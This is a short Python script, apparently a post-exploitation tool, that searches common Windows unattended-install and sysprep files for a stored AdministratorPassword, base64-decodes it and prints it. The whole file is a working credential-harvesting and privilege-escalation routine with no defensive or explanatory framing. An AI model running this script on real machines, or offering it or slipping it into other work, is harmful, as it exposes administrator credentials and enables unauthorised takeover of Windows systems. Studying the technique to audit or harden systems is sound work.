import os
import re
import base64

file_paths = [
    r"C:\unattend.xml",
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Unattend\Unattend.xml",
    r"C:\Windows\system32\sysprep.inf",
    r"C:\Windows\system32\sysprep\sysprep.xml",
    r"C:\Windows\system32\sysprep\autounattend.xml",
]

password_pattern = re.compile(
    r"<AdministratorPassword>\s*<Value>(.*?)</Value>",
    re.IGNORECASE | re.DOTALL
)

for path in file_paths:
    if not os.path.exists(path):
        continue
    print(f"[+] Found: {path}")
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        match = password_pattern.search(f.read())
    if not match:
        continue
    raw = match.group(1).strip()
    raw += "=" * (4 - len(raw) % 4) if len(raw) % 4 != 0 else ""
    try:
        decoded = base64.b64decode(raw).decode("utf-8").replace("\x00", "").strip()
    except Exception:
        decoded = raw
    print(f"[+] Administrator password: {decoded}")
    break
